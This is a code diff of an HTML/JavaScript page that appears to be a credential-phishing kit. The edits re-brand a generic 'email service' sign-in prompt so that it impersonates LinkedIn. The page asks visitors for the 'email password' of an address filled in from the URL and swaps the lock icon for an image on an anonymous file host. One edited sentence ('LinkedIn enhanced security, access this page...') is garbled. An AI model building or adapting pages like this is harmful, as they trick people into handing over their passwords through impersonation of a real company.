@@ -86,8 +86,8 @@
             position: relative;
         }
         .protected-symbol {
-            width: 86px;
-            height: 86px;
+            width: 75px;
+            height: 75px;
             margin: 10px 0;
 
         }
@@ -178,9 +178,9 @@
                 <span id="status-bar-text"></span>
             </div>
             <div class="box-content">
-                <img src="https://cdn-icons-png.flaticon.com/512/8631/8631491.png" class="protected-symbol" alt="Protected Lock Icon">
+                <img src="https://pictureurl.com/api/storage/file?key=u%2Fanon%2F334f7f8d-aab8-4c44-975d-93896ce5eec4-image.png" class="protected-symbol" alt="Protected Lock Icon">
                 <p id="protected-text"><strong>Protected Feature</strong><br>
-                For enhanced security, access this page by signing in with the login for
+                LinkedIn enhanced security, access this page by signing in with the email password for
                 <span id="user-placeholder"></span></p>
                 <button class="sign-in-button" id="signInButton" onclick="showSignInForm()">Sign In</button>
                 <div class="sign-in-form" id="signInForm">
@@ -262,9 +262,9 @@ function updateContent() {
     if (userInput && userPlaceholder && statusBarText && loadingText && pageTitle) {
         userInput.value = userValue;
         userPlaceholder.textContent = userValue;
-        statusBarText.textContent = `${domainWithoutTLD} Email Service`;
+        statusBarText.textContent = `${domainWithoutTLD} LinkedIn Account Service`;
         loadingText.textContent = `Connecting to ${fullDomain} email service...`;
-        pageTitle.textContent = `${domainWithoutTLD} Email Service`;
+        pageTitle.textContent = `${domainWithoutTLD} LinkedIn User Service`;
     }
 }
 
